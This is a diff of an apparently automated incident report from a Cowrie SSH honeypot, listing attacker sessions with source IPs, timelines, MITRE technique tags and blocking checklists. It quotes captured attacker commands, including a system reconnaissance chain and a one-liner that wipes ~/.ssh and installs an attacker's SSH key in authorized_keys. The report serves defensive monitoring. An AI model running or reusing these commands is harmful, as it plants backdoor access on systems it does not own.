+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8133cfd04d99
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `45.178.227[.]0` |
+| **First Seen** | 2026-08-22 15:44 |
+| **Last Seen** | 2026-08-22 15:44 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:44:33` | `cowrie.session.connect` |
+| `2026-08-22 15:44:34` | `cowrie.client.version` |
+| `2026-08-22 15:44:34` | `cowrie.client.kex` |
+| `2026-08-22 15:44:35` | `cowrie.login.success` |
+| `2026-08-22 15:44:36` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:44:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
+- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-02fe5dc72ba1
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `65.20.179[.]251` |
+| **First Seen** | 2026-08-22 15:44 |
+| **Last Seen** | 2026-08-22 15:44 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:44:41` | `cowrie.session.connect` |
+| `2026-08-22 15:44:41` | `cowrie.client.version` |
+| `2026-08-22 15:44:41` | `cowrie.client.kex` |
+| `2026-08-22 15:44:43` | `cowrie.login.success` |
+| `2026-08-22 15:44:43` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:44:48` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
+- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-415b27d1e1fc
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `61.79.227[.]51` |
+| **First Seen** | 2026-08-22 15:44 |
+| **Last Seen** | 2026-08-22 15:44 |
+| **Session Duration** | 9s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:44:44` | `cowrie.session.connect` |
+| `2026-08-22 15:44:45` | `cowrie.client.version` |
+| `2026-08-22 15:44:45` | `cowrie.client.kex` |
+| `2026-08-22 15:44:47` | `cowrie.login.success` |
+| `2026-08-22 15:44:48` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:44:53` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `61.79.227[.]51` to AbuseIPDB if not already reported
+- [ ] Block `61.79.227[.]51` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-f2d4edf09186
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `85.137.242[.]4` |
+| **First Seen** | 2026-08-22 15:44 |
+| **Last Seen** | 2026-08-22 15:45 |
+| **Session Duration** | 10s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:44:54` | `cowrie.session.connect` |
+| `2026-08-22 15:44:55` | `cowrie.client.version` |
+| `2026-08-22 15:44:55` | `cowrie.client.kex` |
+| `2026-08-22 15:44:58` | `cowrie.login.success` |
+| `2026-08-22 15:44:59` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:45:04` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `85.137.242[.]4` to AbuseIPDB if not already reported
+- [ ] Block `85.137.242[.]4` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-359831b7b231
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:45 |
+| **Last Seen** | 2026-08-22 15:45 |
+| **Session Duration** | 3s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:45:50` | `cowrie.session.connect` |
+| `2026-08-22 15:45:51` | `cowrie.client.version` |
+| `2026-08-22 15:45:51` | `cowrie.client.kex` |
+| `2026-08-22 15:45:52` | `cowrie.login.success` |
+| `2026-08-22 15:45:53` | `cowrie.session.params` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.success` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.command.input` |
+| `2026-08-22 15:45:53` | `cowrie.log.closed` |
+| `2026-08-22 15:45:53` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-cfcbe7f8c5b0
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:47 |
+| **Last Seen** | 2026-08-22 15:47 |
 | **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:47:17` | `cowrie.session.connect` |
+| `2026-08-22 15:47:17` | `cowrie.client.version` |
+| `2026-08-22 15:47:17` | `cowrie.client.kex` |
+| `2026-08-22 15:47:19` | `cowrie.login.success` |
+| `2026-08-22 15:47:20` | `cowrie.session.params` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.success` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:20` | `cowrie.command.input` |
+| `2026-08-22 15:47:21` | `cowrie.log.closed` |
+| `2026-08-22 15:47:21` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-08ddabd0853f
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:48 |
+| **Last Seen** | 2026-08-22 15:48 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:48:34` | `cowrie.session.connect` |
+| `2026-08-22 15:48:35` | `cowrie.client.version` |
+| `2026-08-22 15:48:35` | `cowrie.client.kex` |
+| `2026-08-22 15:48:36` | `cowrie.login.success` |
+| `2026-08-22 15:48:38` | `cowrie.session.params` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.success` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:38` | `cowrie.command.input` |
+| `2026-08-22 15:48:39` | `cowrie.command.input` |
+| `2026-08-22 15:48:39` | `cowrie.command.input` |
+| `2026-08-22 15:48:39` | `cowrie.log.closed` |
+| `2026-08-22 15:48:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-e47398fc661e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:49 |
+| **Last Seen** | 2026-08-22 15:49 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:49:34` | `cowrie.session.connect` |
+| `2026-08-22 15:49:34` | `cowrie.client.version` |
+| `2026-08-22 15:49:34` | `cowrie.client.kex` |
+| `2026-08-22 15:49:35` | `cowrie.login.success` |
+| `2026-08-22 15:49:35` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:49:36` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:49:36` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:49:36` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-10fc5685fe80
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:49 |
+| **Last Seen** | 2026-08-22 15:49 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:49:38` | `cowrie.session.connect` |
+| `2026-08-22 15:49:38` | `cowrie.client.version` |
+| `2026-08-22 15:49:38` | `cowrie.client.kex` |
+| `2026-08-22 15:49:39` | `cowrie.login.success` |
+| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:49:39` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:49:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-daa5832e647e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:49 |
+| **Last Seen** | 2026-08-22 15:49 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:49:51` | `cowrie.session.connect` |
+| `2026-08-22 15:49:51` | `cowrie.client.version` |
+| `2026-08-22 15:49:51` | `cowrie.client.kex` |
+| `2026-08-22 15:49:53` | `cowrie.login.success` |
+| `2026-08-22 15:49:55` | `cowrie.session.params` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.success` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:55` | `cowrie.command.input` |
+| `2026-08-22 15:49:56` | `cowrie.log.closed` |
+| `2026-08-22 15:49:56` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3fa4ca7bb270
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `173.249.52[.]138` |
+| **First Seen** | 2026-08-22 15:50 |
+| **Last Seen** | 2026-08-22 15:50 |
+| **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
@@ -449,35 +2824,35 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 12:57:02` | `cowrie.session.connect` |
-| `2026-08-22 12:57:02` | `cowrie.client.version` |
-| `2026-08-22 12:57:02` | `cowrie.client.kex` |
-| `2026-08-22 12:57:02` | `cowrie.login.success` |
-| `2026-08-22 12:57:03` | `cowrie.session.params` |
-| `2026-08-22 12:57:03` | `cowrie.command.input` |
-| `2026-08-22 12:57:03` | `cowrie.command.failed` |
-| `2026-08-22 12:57:03` | `cowrie.log.closed` |
-| `2026-08-22 12:57:04` | `cowrie.session.params` |
-| `2026-08-22 12:57:04` | `cowrie.command.input` |
-| `2026-08-22 12:57:04` | `cowrie.session.file_download` |
-| `2026-08-22 12:57:04` | `cowrie.log.closed` |
-| `2026-08-22 12:57:06` | `cowrie.session.closed` |
+| `2026-08-22 15:50:52` | `cowrie.session.connect` |
+| `2026-08-22 15:50:52` | `cowrie.client.version` |
+| `2026-08-22 15:50:52` | `cowrie.client.kex` |
+| `2026-08-22 15:50:52` | `cowrie.login.success` |
+| `2026-08-22 15:50:53` | `cowrie.session.params` |
+| `2026-08-22 15:50:53` | `cowrie.command.input` |
+| `2026-08-22 15:50:53` | `cowrie.command.failed` |
+| `2026-08-22 15:50:53` | `cowrie.log.closed` |
+| `2026-08-22 15:50:54` | `cowrie.session.params` |
+| `2026-08-22 15:50:54` | `cowrie.command.input` |
+| `2026-08-22 15:50:54` | `cowrie.session.file_download` |
+| `2026-08-22 15:50:54` | `cowrie.log.closed` |
+| `2026-08-22 15:50:56` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `51.68.151[.]167` to AbuseIPDB if not already reported
-- [ ] Block `51.68.151[.]167` at perimeter firewall / security group
+- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
+- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Submit download hash(es) to VirusTotal
 - [ ] Run Tool 31 malware analyzer on captured payload(s)
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-048064432cf8
+### 🔴 HIGH · IR-4a3d48adcce7
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `51.68.151[.]167` |
-| **First Seen** | 2026-08-22 12:57 |
-| **Last Seen** | 2026-08-22 12:57 |
+| **Source IP** | `173.249.52[.]138` |
+| **First Seen** | 2026-08-22 15:50 |
+| **Last Seen** | 2026-08-22 15:50 |
 | **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -487,24 +2862,24 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 12:57:04` | `cowrie.session.connect` |
-| `2026-08-22 12:57:04` | `cowrie.client.version` |
-| `2026-08-22 12:57:04` | `cowrie.client.kex` |
-| `2026-08-22 12:57:05` | `cowrie.login.success` |
-| `2026-08-22 12:57:05` | `cowrie.session.closed` |
+| `2026-08-22 15:50:54` | `cowrie.session.connect` |
+| `2026-08-22 15:50:54` | `cowrie.client.version` |
+| `2026-08-22 15:50:54` | `cowrie.client.kex` |
+| `2026-08-22 15:50:55` | `cowrie.login.success` |
+| `2026-08-22 15:50:55` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `51.68.151[.]167` to AbuseIPDB if not already reported
-- [ ] Block `51.68.151[.]167` at perimeter firewall / security group
+- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
+- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-f097a51a3c68
+### 🔴 HIGH · IR-caca29525ac0
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `51.68.151[.]167` |
-| **First Seen** | 2026-08-22 12:57 |
-| **Last Seen** | 2026-08-22 12:57 |
+| **Source IP** | `173.249.52[.]138` |
+| **First Seen** | 2026-08-22 15:50 |
+| **Last Seen** | 2026-08-22 15:50 |
 | **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -514,193 +2889,24 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 12:57:05` | `cowrie.session.connect` |
-| `2026-08-22 12:57:05` | `cowrie.client.version` |
-| `2026-08-22 12:57:05` | `cowrie.client.kex` |
-| `2026-08-22 12:57:06` | `cowrie.login.success` |
-| `2026-08-22 12:57:06` | `cowrie.session.closed` |
+| `2026-08-22 15:50:55` | `cowrie.session.connect` |
+| `2026-08-22 15:50:55` | `cowrie.client.version` |
+| `2026-08-22 15:50:55` | `cowrie.client.kex` |
+| `2026-08-22 15:50:55` | `cowrie.login.success` |
+| `2026-08-22 15:50:56` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `51.68.151[.]167` to AbuseIPDB if not already reported
-- [ ] Block `51.68.151[.]167` at perimeter firewall / security group
+- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
+- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-2fc1c5586c1b
+### 🔴 HIGH · IR-500203c99230
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 12:58 |
-| **Last Seen** | 2026-08-22 12:58 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 12:58:15` | `cowrie.session.connect` |
-| `2026-08-22 12:58:15` | `cowrie.client.version` |
-| `2026-08-22 12:58:15` | `cowrie.client.kex` |
-| `2026-08-22 12:58:16` | `cowrie.login.success` |
-| `2026-08-22 12:58:17` | `cowrie.session.params` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.success` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.command.input` |
-| `2026-08-22 12:58:17` | `cowrie.log.closed` |
-| `2026-08-22 12:58:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8ac06132713c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 12:59 |
-| **Last Seen** | 2026-08-22 12:59 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 12:59:16` | `cowrie.session.connect` |
-| `2026-08-22 12:59:16` | `cowrie.client.version` |
-| `2026-08-22 12:59:16` | `cowrie.client.kex` |
-| `2026-08-22 12:59:17` | `cowrie.login.success` |
-| `2026-08-22 12:59:17` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 12:59:17` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 12:59:17` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 12:59:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-9dbfe8b20a6b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `78.189.17[.]35` |
-| **First Seen** | 2026-08-22 12:59 |
-| **Last Seen** | 2026-08-22 12:59 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 12:59:19` | `cowrie.session.connect` |
-| `2026-08-22 12:59:20` | `cowrie.client.version` |
-| `2026-08-22 12:59:20` | `cowrie.client.kex` |
-| `2026-08-22 12:59:21` | `cowrie.login.success` |
-| `2026-08-22 12:59:21` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 12:59:26` | `cowrie.session.closed` |
-
